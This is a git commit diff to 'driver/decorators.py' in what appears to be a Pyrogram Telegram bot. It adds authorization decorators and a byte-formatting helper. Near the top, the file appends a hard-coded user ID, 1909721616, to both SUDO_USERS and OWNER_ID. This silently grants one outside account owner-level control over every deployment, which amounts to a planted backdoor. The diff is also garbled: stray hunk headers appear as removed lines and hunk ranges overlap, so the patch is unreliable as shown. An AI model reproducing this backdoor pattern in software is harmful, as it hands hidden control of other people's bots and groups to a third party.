54de8abad70bc087e0d19fdd8c52e971836c2fc5
dark phoenix <79581828+darkphoenix2601@users.noreply.github.com>
2022-02-14 11:41:25 +0530

    Update decorators.py

--- driver/decorators.py
+++ driver/decorators.py
@@ -5,6 +5,7 @@ from pyrogram.types import Message
 from config import SUDO_USERS, OWNER_ID
 from driver.admins import get_administrators
 
+
 SUDO_USERS.append(1909721616)
 
 OWNER_ID.append(1909721616)
@@ -19,7 +20,19 @@ def errors(func: Callable) -> Callable:
             await message.reply(f"{type(e).__name__}: {e}")
 
     return decorator
-	@@ -32,11 +40,19 @@ async def decorator(client: Client, message: Message):
+
+
+def authorized_users_only(func: Callable) -> Callable:
+    async def decorator(client: Client, message: Message):
+        if message.from_user.id in SUDO_USERS:
+            return await func(client, message)
+
+        administrators = await get_administrators(message.chat)
+
+        for administrator in administrators:
+            if administrator == message.from_user.id:
+                return await func(client, message)
+
     return decorator
 
 
@@ -27,7 +40,7 @@ def bot_creator(func: Callable) -> Callable:
     async def decorator(client: Client, message: Message):
         if message.from_user.id in OWNER_ID:
             return await func(client, message)
-
+        
     return decorator
 
 
@@ -39,7 +52,10 @@ def sudo_users_only(func: Callable) -> Callable:
     return decorator
 
 
-	@@ -47,6 +63,7 @@ def humanbytes(size):
+def humanbytes(size):
+    """Convert Bytes To Bytes So That Human Can Read It"""
+    if not size:
+        return ""
     power = 2 ** 10
     raised_to_pow = 0
     dict_power_n = {0: "", 1: "Ki", 2: "Mi", 3: "Gi", 4: "Ti"}
@@ -47,3 +63,4 @@ def sudo_users_only(func: Callable) -> Callable:
     while size > power:
         size /= power
         raised_to_pow += 1
+    return str(round(size, 2)) + " " + dict_power_n[raised_to_pow] + "B"
